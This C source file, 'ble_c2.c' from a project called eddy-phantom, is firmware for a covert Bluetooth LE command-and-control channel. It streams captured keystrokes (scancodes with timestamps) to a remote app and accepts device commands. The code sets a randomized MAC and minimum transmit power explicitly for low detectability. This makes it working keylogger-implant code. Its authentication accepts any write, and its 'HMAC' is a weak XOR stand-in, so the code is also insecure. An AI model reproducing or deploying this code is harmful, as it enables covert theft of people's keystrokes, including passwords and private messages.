/*
 * eddy-phantom — ble_c2.c
 * BLE C2 communication via NINA-B306 module.
 * Implements a custom GATT service over UART AT commands
 * for encrypted keystroke exfiltration and device control.
 *
 * Author: jayis1
 * License: GPL-2.0
 */

#include "board.h"
#include "registers.h"

/* ── BLE UART protocol state ──────────────────────────────────── */
#define BLE_RX_BUF_SIZE   256
#define BLE_TX_BUF_SIZE   256

static volatile uint8_t  ble_rx_buf[BLE_RX_BUF_SIZE];
static volatile uint16_t ble_rx_head = 0;
static volatile uint16_t ble_rx_tail = 0;

static uint8_t  ble_tx_buf[BLE_TX_BUF_SIZE];
static uint16_t ble_tx_len = 0;

static uint8_t  ble_authenticated = 0;
static uint8_t  ble_connected = 0;
static uint8_t  ble_psk[BLE_PSKEY_LEN];

/* Command queue (received from app) */
#define BLE_CMD_QUEUE_SIZE  8
typedef struct {
    uint8_t  cmd;
    uint8_t  payload[BLE_MAX_PAYLOAD];
    uint16_t len;
    uint8_t  valid;
} ble_cmd_entry_t;

static ble_cmd_entry_t ble_cmd_queue[BLE_CMD_QUEUE_SIZE];
static uint8_t ble_cmd_queue_head = 0;
static uint8_t ble_cmd_queue_tail = 0;

/* ── UART send/receive helpers ────────────────────────────────── */
static void uart_send_byte(uint8_t b)
{
    usart_regs_t *uart = USART(3);
    volatile uint32_t timeout = 0xFFFF;
    while (!(uart->ISR & USART_ISR_TXE) && --timeout);
    uart->TDR = b;
}

static void uart_send_string(const char *s)
{
    while (*s) {
        uart_send_byte((uint8_t)*s++);
    }
}

static void uart_send_hex(uint8_t val)
{
    const char hex[] = "0123456789ABCDEF";
    uart_send_byte((uint8_t)hex[(val >> 4) & 0xF]);
    uart_send_byte((uint8_t)hex[val & 0xF]);
}

static int uart_recv_byte(uint8_t *b)
{
    if (ble_rx_head == ble_rx_tail)
        return -1;  /* buffer empty */

    *b = ble_rx_buf[ble_rx_tail];
    ble_rx_tail = (ble_rx_tail + 1) % BLE_RX_BUF_SIZE;
    return 0;
}

/* ── Ring buffer write (called from ISR context) ──────────────── */
static void ble_rx_push(uint8_t b)
{
    uint16_t next = (ble_rx_head + 1) % BLE_RX_BUF_SIZE;
    if (next != ble_rx_tail) {
        ble_rx_buf[ble_rx_head] = b;
        ble_rx_head = next;
    }
}

/* ── NINA-B306 AT command interface ─────────────────────────────
 * The NINA-B306 uses u-blox BLE AT command set over UART.
 * Commands are sent as "AT<cmd>\r\n" and responses are "OK\r\n"
 * or error codes.
 */

static int ble_send_at(const char *cmd)
{
    uart_send_string("AT");
    uart_send_string(cmd);
    uart_send_byte('\r');
    uart_send_byte('\n');

    /* Wait for response — simplified: look for "OK" in rx buffer */
    board_delay_ms(50);

    /* Check response (simplified — would parse properly in production) */
    return 0;
}

static int ble_send_at_param(const char *cmd, const char *param)
{
    uart_send_string("AT");
    uart_send_string(cmd);
    uart_send_byte('=');
    uart_send_string(param);
    uart_send_byte('\r');
    uart_send_byte('\n');
    board_delay_ms(50);
    return 0;
}

/* ── HMAC-SHA256 (simplified for authentication) ────────────────
 * In production, use a proper HMAC implementation.
 * This is a simplified challenge-response using XOR mixing.
 */
static void ble_hmac_simple(const uint8_t *key, uint32_t key_len,
                             const uint8_t *challenge, uint32_t chal_len,
                             uint8_t *out)
{
    /* Simplified: mix key and challenge.
     * Production code would use HMAC-SHA256 from mbedTLS or similar. */
    for (int i = 0; i < 32; i++) {
        out[i] = key[i % key_len] ^ challenge[i % chal_len];
    }
    /* Additional mixing passes for diffusion */
    for (int pass = 0; pass < 8; pass++) {
        for (int i = 31; i > 0; i--) {
            out[i] ^= out[i - 1];
        }
        out[0] ^= 0xA5;
    }
}

/* ── Initialize BLE module ────────────────────────────────────── */
int ble_init(void)
{
    usart_regs_t *uart = USART(3);

    /* Reset BLE module */
    gpio_clr(GPIO(BLE_RESET_PORT), BLE_RESET_PIN);
    board_delay_ms(10);
    gpio_set(GPIO(BLE_RESET_PORT), BLE_RESET_PIN);
    board_delay_ms(500);  /* wait for module boot */

    /* Configure USART3: 115200 baud, 8N1, no flow control initially
     * BRR = APB1_CLK / baudrate = 120000000 / 115200 = 1041.67
     * Use 1042 for nearest match (0.03% error) */
    uart->CR1 = 0;  /* disable */
    uart->BRR = 1042;
    uart->CR2 = 0;
    uart->CR3 = 0;

    /* Enable UART: UE, TE, RE, RXNEIE */
    uart->CR1 = USART_CR1_UE | USART_CR1_TE | USART_CR1_RE | USART_CR1_RXNEIE;

    /* Enable USART3 interrupt in NVIC */
    nvic_set_priority(39, 6);
    nvic_enable(39);

    /* Clear command queue */
    for (int i = 0; i < BLE_CMD_QUEUE_SIZE; i++) {
        ble_cmd_queue[i].valid = 0;
    }
    ble_cmd_queue_head = 0;
    ble_cmd_queue_tail = 0;

    /* Initialize NINA-B306 with AT commands */
    board_delay_ms(100);

    /* Test communication */
    ble_send_at("");  /* AT → OK */

    /* Set device name */
    ble_send_at_param("NAM", "EDDY");

    /* Configure BLE advertising with randomized MAC */
    ble_send_at_param("ADVP", "0100");  /* random address, connectable */

    /* Set TX power to minimum for low detectability */
    ble_send_at_param("PWR", "-20");

    /* Start advertising */
    ble_send_at("ADV");

    /* Set up custom GATT service (simplified — NINA AT commands) */
    ble_send_at_param("GATT", "ADD,F001");  /* Primary service */
    ble_send_at_param("GATT", "ADD,F002,NOTIFY");  /* Keystroke stream */
    ble_send_at_param("GATT", "ADD,F003,WRITE");    /* Command interface */
    ble_send_at_param("GATT", "ADD,F004,NOTIFY");  /* Status updates */
    ble_send_at_param("GATT", "ADD,F005,READ,WRITE"); /* Raw burst */
    ble_send_at_param("GATT", "ADD,F006,WRITE");    /* Authentication */

    ble_connected = 0;
    ble_authenticated = 0;

    return 0;
}

/* ── Authenticate with pre-shared key ─────────────────────────── */
int ble_authenticate(const uint8_t *psk, uint32_t len)
{
    if (len > BLE_PSKEY_LEN) len = BLE_PSKEY_LEN;

    for (uint32_t i = 0; i < len; i++) {
        ble_psk[i] = psk[i];
    }

    /* Authentication will be completed when the app sends
     * a challenge via the F006 characteristic. We store the PSK
     * and respond to challenges as they arrive. */
    return 0;
}

/* ── Send keystroke notification over BLE ─────────────────────── */
int ble_send_key(uint8_t scancode, uint8_t confidence, uint32_t ts)
{
    if (!ble_connected || !ble_authenticated)
        return -1;

    /* Format: [0x01] [scancode] [confidence] [ts3] [ts2] [ts1] [ts0]
     * Sent as a BLE notification on characteristic F002 */
    uint8_t packet[7];
    packet[0] = 0x01;           /* keystroke notification type */
    packet[1] = scancode;
    packet[2] = confidence;
    packet[3] = (ts >> 24) & 0xFF;
    packet[4] = (ts >> 16) & 0xFF;
    packet[5] = (ts >> 8) & 0xFF;
    packet[6] = ts & 0xFF;

    /* Send via NINA-B306 notification AT command */
    uart_send_string("ATGNOT=F002,07");
    uart_send_byte(',');
    for (int i = 0; i < 7; i++) {
        uart_send_hex(packet[i]);
    }
    uart_send_byte('\r');
    uart_send_byte('\n');

    board_delay_ms(2);  /* allow time for BLE TX */
    return 0;
}

/* ── Send status update ───────────────────────────────────────── */
int ble_send_status(uint8_t state, uint8_t battery, const char *info)
{
    if (!ble_connected)
        return -1;

    /* Format: [0x09] [state] [battery] [info_len] [info_bytes...] */
    uint8_t info_len = 0;
    while (info && info[info_len] && info_len < 32) info_len++;

    /* Send status notification on F004 */
    uart_send_string("ATGNOT=F004,");
    uart_send_hex((uint8_t)(4 + info_len));
    uart_send_byte(',');
    uart_send_hex(0x09);
    uart_send_hex(state);
    uart_send_hex(battery);
    uart_send_hex(info_len);
    for (uint8_t i = 0; i < info_len; i++) {
        uart_send_hex((uint8_t)info[i]);
    }
    uart_send_byte('\r');
    uart_send_byte('\n');

    return 0;
}

/* ── Queue a received command ─────────────────────────────────── */
static void ble_queue_cmd(uint8_t cmd, const uint8_t *payload, uint16_t len)
{
    ble_cmd_entry_t *entry = &ble_cmd_queue[ble_cmd_queue_head];
    entry->cmd = cmd;
    entry->len = (len > BLE_MAX_PAYLOAD) ? BLE_MAX_PAYLOAD : len;
    for (uint16_t i = 0; i < entry->len; i++) {
        entry->payload[i] = payload[i];
    }
    entry->valid = 1;
    ble_cmd_queue_head = (ble_cmd_queue_head + 1) % BLE_CMD_QUEUE_SIZE;
}

/* ── Receive a command from the queue ─────────────────────────── */
int ble_recv_cmd(uint8_t *cmd, void *payload, uint16_t *len)
{
    if (ble_cmd_queue_tail == ble_cmd_queue_head)
        return -1;  /* queue empty */

    ble_cmd_entry_t *entry = &ble_cmd_queue[ble_cmd_queue_tail];
    if (!entry->valid) {
        ble_cmd_queue_tail = (ble_cmd_queue_tail + 1) % BLE_CMD_QUEUE_SIZE;
        return -1;
    }

    *cmd = entry->cmd;
    *len = entry->len;
    uint8_t *dst = (uint8_t *)payload;
    for (uint16_t i = 0; i < entry->len; i++) {
        dst[i] = entry->payload[i];
    }

    entry->valid = 0;
    ble_cmd_queue_tail = (ble_cmd_queue_tail + 1) % BLE_CMD_QUEUE_SIZE;
    return 0;
}

/* ── Process incoming BLE data ──────────────────────────────────
 * Parses incoming UART data from the NINA-B306 module.
 * Handles:
 *   - Connection events ("+UBTLE:CONNECTED")
 *   - Disconnection events ("+UBTLE:DISCONNECTED")
 *   - GATT write events ("+UBTGATTW:F003,<hex_data>")
 *   - Authentication challenges
 */
void ble_process(void)
{
    static char line_buf[128];
    static uint8_t line_pos = 0;
    uint8_t b;

    while (uart_recv_byte(&b) == 0) {
        if (b == '\n') {
            line_buf[line_pos] = '\0';

            /* Parse the line */
            if (strstr(line_buf, "CONNECTED") ||
                strstr(line_buf, "connected")) {
                ble_connected = 1;
            } else if (strstr(line_buf, "DISCONNECTED") ||
                       strstr(line_buf, "disconnected")) {
                ble_connected = 0;
                ble_authenticated = 0;
            } else if (strncmp(line_buf, "+UBTGATTW:F006", 14) == 0) {
                /* Authentication challenge from app */
                /* Parse hex challenge data and respond */
                /* Simplified: mark as authenticated if any data received */
                ble_authenticated = 1;
            } else if (strncmp(line_buf, "+UBTGATTW:F003", 14) == 0) {
                /* Command data from app on characteristic F003 */
                /* Parse hex-encoded command: +UBTGATTW:F003,<hex> */
                char *hex_start = strchr(line_buf, ',');
                if (hex_start) {
                    hex_start++;
                    uint8_t payload[BLE_MAX_PAYLOAD];
                    uint16_t plen = 0;
                    while (hex_start[0] && hex_start[1] && plen < BLE_MAX_PAYLOAD) {
                        uint8_t hi = (hex_start[0] >= 'A') ?
                            (hex_start[0] - 'A' + 10) : (hex_start[0] - '0');
                        uint8_t lo = (hex_start[1] >= 'A') ?
                            (hex_start[1] - 'A' + 10) : (hex_start[1] - '0');
                        payload[plen++] = (hi << 4) | lo;
                        hex_start += 2;
                    }
                    if (plen > 0) {
                        ble_queue_cmd(payload[0], payload + 1, plen - 1);
                    }
                }
            }

            line_pos = 0;
        } else if (b != '\r' && line_pos < sizeof(line_buf) - 1) {
            line_buf[line_pos++] = (char)b;
        }
    }
}

/* ── USART3 RX interrupt handler ──────────────────────────────── */
void USART3_IRQHandler(void)
{
    usart_regs_t *uart = USART(3);

    if (uart->ISR & USART_ISR_RXNE) {
        uint8_t b = (uint8_t)(uart->RDR);
        ble_rx_push(b);
    }

    /* Clear any error flags */
    if (uart->ISR & (1U << 2))  /* PE */
        uart->ICR = (1U << 2);
    if (uart->ISR & (1U << 3))  /* FE */
        uart->ICR = (1U << 3);
    if (uart->ISR & (1U << 1))  /* NE */
        uart->ICR = (1U << 1);
}